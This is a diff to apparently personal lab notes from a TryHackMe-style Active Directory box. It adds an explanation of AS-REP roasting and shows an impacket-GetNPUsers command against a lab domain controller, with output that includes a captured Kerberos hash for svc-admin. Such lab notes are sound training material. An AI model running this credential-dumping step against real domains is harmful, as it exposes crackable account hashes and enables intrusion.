@@ -1,5 +1,8 @@
 
+dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication (NP = no preauth) disabled
+
 `impacket-GetNPUsers spookysec.local/ -usersfile userlist.txt -no-pass -dc-ip 10.10.106.240`
+
 
 ```sh
 ┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
@@ -21,15 +24,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:66ca4f25d28857dab71b6de84734f5ca$87c3593
 [-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
-
-
-
-
-
-
 ```
-
-
 
 ### Help
 
